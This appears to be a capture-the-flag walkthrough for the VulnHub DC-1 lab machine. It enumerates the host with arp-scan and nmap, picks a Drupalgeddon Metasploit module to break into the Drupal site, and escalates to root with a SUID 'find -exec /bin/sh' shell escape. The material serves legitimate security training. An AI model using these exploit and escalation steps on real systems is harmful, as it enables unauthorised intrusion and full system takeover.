# DC-1

## 1.Enumeration

Let's scan for the ip address:

```bash
root@kali: arp-scan -I eth0 -l
Interface: eth0, type: EN10MB, MAC: 08:00:27:b2:e9:3f, IPv4: 192.168.56.102
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.56.1	0a:00:27:00:00:0f	(Unknown: locally administered)
192.168.56.100	08:00:27:0e:16:d9	PCS Systemtechnik GmbH
192.168.56.113	08:00:27:b8:2f:68	PCS Systemtechnik GmbH
```

The IP address is `192.168.56.113`

```bash
root@kali: nmap -sC -sV -p22,80,111,33997 -v -oN nmap.out 192.168.56.113

Nmap scan report for 192.168.56.113
Host is up (0.00046s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
| ssh-hostkey: 
|   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)
|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)
|_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)
80/tcp    open  http    Apache httpd 2.2.22 ((Debian))
|_http-generator: Drupal 7 (http://drupal.org)
|_http-title: Welcome to Drupal Site | Drupal Site
|_http-server-header: Apache/2.2.22 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: B6341DFC213100C61DB4FB8775878CEC
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          33997/tcp   status
|   100024  1          40014/tcp6  status
|   100024  1          47535/udp6  status
|_  100024  1          52850/udp   status
33997/tcp open  status  1 (RPC #100024)
MAC Address: 08:00:27:B8:2F:68 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Exploring port 80 shows website is a Drupal CMS, so we need to exploit a drupal

for finding the version use the command below:

```bash
curl http://192.168.56.113/ | grep 'content="Drupal'

<meta name="Generator" content="Drupal 7 (http://drupal.org)" />
```

## 2.Gaining Access


next we need to check any public exploit for this version :

```bash
root@kali: searchsploit drupal 7 | grep -i metasploit

Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)                                                              | php/webapps/44557.rb
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)                                                              | php/webapps/44557.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)                                               | php/remote/44482.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)                                               | php/remote/44482.rb
Drupal < 8.5.11 / < 8.6.10 - RESTful Web Services unserialize() Remote Command Execution (Metasploit)                                 | php/remote/46510.rb
Drupal < 8.5.11 / < 8.6.10 - RESTful Web Services unserialize() Remote Command Execution (Metasploit)                                 | php/remote/46510.rb
Drupal Module CODER 2.5 - Remote Command Execution (Metasploit)                                                                       | php/webapps/40149.rb
Drupal Module RESTWS 7.x - PHP Remote Code Execution (Metasploit)
```

as it shows there are afew exploits with metasploit:

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/349468c4-b34c-464b-9ddc-1213ba7a7a73)

i used `multi/http/drupal_drupageddon` :

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/7de0d071-2ffe-496b-bf0b-336f6516ec22)

## 3.Privilege Escalation

Search for any SUID binaries on the system  :

```bash
root@kali: find / -user root -perm /4000 2>/dev/null

/bin/mount
/bin/ping
/bin/su
/bin/ping6
/bin/umount
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/procmail
/usr/bin/find
/usr/sbin/exim4
/usr/lib/pt_chown
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/sbin/mount.nfs
```

there is `find` binary here, so it can be easily exploited :

```bash
www-data@DC-1: find . -exec /bin/sh \; -quit

# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)

cd /root

cat thefinalflag.txt
Well done!!!!

Hopefully you've enjoyed this and learned some new skills.

You can let me know what you thought of this little journey
by contacting me via Twitter - @DCAU7
```

this is how you can get root on the system.









